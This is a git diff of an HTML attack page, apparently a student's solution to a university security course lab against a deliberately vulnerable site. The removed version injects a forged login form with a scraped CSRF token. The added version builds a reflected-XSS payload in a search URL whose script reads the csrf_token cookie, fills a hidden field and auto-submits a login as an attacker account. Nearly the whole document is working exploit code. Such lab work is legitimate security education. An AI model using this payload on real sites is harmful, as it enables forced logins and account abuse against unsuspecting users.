@@ -4,27 +4,27 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 </head>
 <body>
-	<iframe src="https://eecs388.org/project2/" id="ifr" height="600" width="800">
-		<p id="csrf_token" style="display:none"></p>
-		<script type="text/javascript">
-			$(document).ready(function(){
-				var csrf_token_val = $('form.form-inline').children('input').val();
-				console.log("hi");
-				console.log(csrf_token_val);
-				$("#csrf_token").text(csrf_token_val);
-			});
-		</script>
-		<iframe srcdoc="" id="ifr" style="display:none"></iframe>
-		<button>Press</button>
-		<script>
-		$(document).ready(function(){
-			$("button").click(function() {
-				var csrf_token_val = $("#csrf_token").text(); //"228916cf3daf26d299fbb2f828f4f736";
-				var form_injection = "<form action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0' method='post' id='formid'><input type='hidden' name='csrf_token' value='" + csrf_token_val + "'><input type='text' name='username' value='attacker'><input type='text' name='password' value='l33th4x'></form><script>document.getElementById('formid').submit();</scr" + "ipt>";
-				$("#ifr").attr("srcdoc", form_injection);
-			});
-		});
-		</script>
-	</iframe>
+	<iframe srcdoc="" id="ifr" style="display:none"></iframe>
+	<script>
+	$(document).ready(function(){
+		var content = `<script>` + `var url = "https://eecs388.org/project2/search?csrfdefense=1&xssdefense=0&q=";
+
+		var form_injection = "<form action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0' method='post' id='formid'><input type='text' name='username' value='attacker'><input type='text' name='password' value='l33th4x'><input type='hidden' id='tok' name='csrf_token' value=''></form>";
+
+		var setVariables = "var tok = '';var tok_id = 'csrf_token=';var ca = document.cookie.split(';');";
+		var getCookie = "for(var i = 0; i < ca.length; i++) {var c = ca[i];while(c.charAt(0)==' ') {c = c.substring(1);} if(c.indexOf(tok_id) == 0) {tok = c.substring(tok_id.length,c.length);}}";
+		//var setHiddenValue = "$('#formid').children('input').val(tok);"
+		var setHiddenValue = "$('#tok').val(tok);"
+		var submitForm = "$('#formid').submit();";
+		//var js_injection = "<script>" + setVariables + getCookie + "alert(tok);" + "</scr" + "ipt>"
+		//var js_injection = "<script>" + setVariables + getCookie + setHiddenValue + "</scr" + "ipt>";
+	    var js_injection = "<script>" + setVariables + getCookie + setHiddenValue + submitForm + "</scr" + "ipt>";
+
+	    var full_injection = form_injection + js_injection;
+	    var fullURL = url + encodeURIComponent(full_injection);
+	    window.location.href = fullURL;` + `</scr` + `ipt>`;
+	    $("#ifr").attr("srcdoc", content);
+	});
+	</script>
 </body>
 </html>
